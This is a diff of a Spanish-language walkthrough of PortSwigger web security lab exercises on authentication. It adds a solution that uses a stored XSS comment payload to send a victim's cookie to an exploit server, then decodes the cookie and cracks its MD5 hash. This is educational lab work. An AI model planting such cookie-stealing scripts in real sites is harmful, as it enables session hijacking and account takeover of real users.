@@ -23,10 +23,12 @@ Todos los laboratorios posteriormente expuestos los puedes encontrar para resolv
   * [7.  Lab: 2FA simple bypass](#7--lab-2fa-simple-bypass)
   * [8. Lab: 2FA broken logic](#8-lab-2fa-broken-logic)
   * [9. Lab: 2FA bypass using a brute-force attack](#9-lab-2fa-bypass-using-a-brute-force-attack)
+- [Otros Mecanismos](#otros-mecanismos)
   * [10. Lab: Brute-forcing a stay-logged-in cookie](#10-lab-brute-forcing-a-stay-logged-in-cookie)
   * [11. Lab: Offline password cracking](#11-lab-offline-password-cracking)
+  * [12. Lab: Password reset broken logic](#12-lab-password-reset-broken-logic)
 
-## BRUTERFORCE
+# BRUTERFORCE
 
 ## 1. Lab: Username enumeration via different responses
 
@@ -561,7 +563,7 @@ En este caso solo nos queda probar una de las dos claves y logearnos de manera e
 
 ![done](img20.png)
 
-## DOBLE FACTOR
+# DOBLE FACTOR
 
 ## 7.  Lab: 2FA simple bypass
 
@@ -694,6 +696,8 @@ Luego le damos **Start Attack** Y esperamos que salgo un codigo 302 como en el e
 
 ![](img51.png)
 
+# OTROS MECANISMOS
+
 ## 10. Lab: Brute-forcing a stay-logged-in cookie
 
 Lo que haremos será logearnos activando la opcion de mentenerse conectados. Y luego interceptamos el paquete de consulta get luego del logeo.
@@ -739,4 +743,87 @@ Y luego hacemos clic en **Start Attack**. Luego ordenamos por **Status** y obten
 Y Listo :D.
 
 ## 11. Lab: Offline password cracking
+
+En este nivel, lo que haremos será logearnos, luego vamos a un post cualquiera, y verificamos si es que es vulnerable a XSS. Lo haremos de manera simple con el siguiente payload.
+
+```html
+<h1>a</h1>
+```
+
+Y como podemos ver, si funciona el XSS.
+
+![](img56.png)
+
+Ahora lo que haremos será extraer la cookie por XSS mediante el siguiente payload.
+
+```html
+<script>document.location = 'http://www.example.com/'+document.cookie</script>
+```
+
+Ahora en el laboratorio hacemos clic en el boon que dice: **Go To Exploit Server**
+
+y copiamos la url que nos dá la cual es:
+
+```html
+https://ac7c1f021e27dd52807d874e0145004b.web-security-academy.net/exploit
+```
+
+Entonces ahora nuestro payload será:
+
+```html
+<script>document.location = 'https://ac7c1f021e27dd52807d874e0145004b.web-security-academy.net/exploit/'+document.cookie</script>
+```
+
+Entonces creamos un nuevo comentario con el payload definitivo.
+
+![](img57.png)
+
+Y enviamos el comentario. Ahora en el Exploit Server, vamos a la seccion que dice: **access log** en la parte inferior.
+
+![](img58.png)
+
+Y como podemos ver, encontramos una consulta que contiene una cookie.
+
+![](img59.png)
+
+Lo que haremos será copiarla, para tratarla, para ser mas exactos el parametro **stay-logged-in**
+
+```bash
+stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+```
+
+Como podemos ver, parece base64, asi que vamos a pasar a decodificarlo.
+
+```bash
+└──╼ $echo Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz | base64 -d
+carlos:26323c16d5f4dabff3bb136f2460a943
+```
+
+Buscando en internet nos encontramos con el siguiente resultado:
+
+```bash
+http://www.md5this.com/list.php?page=71026&key=1&author=ToXiC&country=Cyprus&city=Nicosia
+
+Donde:
+
+Added:	Thu 12th May,2011 02:56 am	Hash:	26323c16d5f4dabff3bb136f2460a943	Plain:	onceuponatime
+```
+
+Entonces intentamos logearnos con el usuario **carlos** y la clave **onceuponatime**.
+
+![](img60.png)
+
+Ahora, para completar el reto debemos eliminar la cuenta de **carlos**.
+
+![](img61.png)
+
+Nos pregunta si estamos seguro y le damos en **Delete account!**.
+
+![](img62.png)
+
+Y Luego de ello logramos completar el laboratorio.
+
+**Nota: Tiene sentido que nos pidan eliminar la cuenta y no solo acceder a la seccion de My Account, porque obteniendo la cookie ya podemos iniciar session, pero no estariamos demostrando que crackeamos la contraseña, por eso el reto nos pide eliminar la cuenta para de esta manera al darle deleted, nos pida una confirmacion de contraseña que no hubieramos sabiado si no decifrabamos el hash.**
+
+## 12. Lab: Password reset broken logic
 
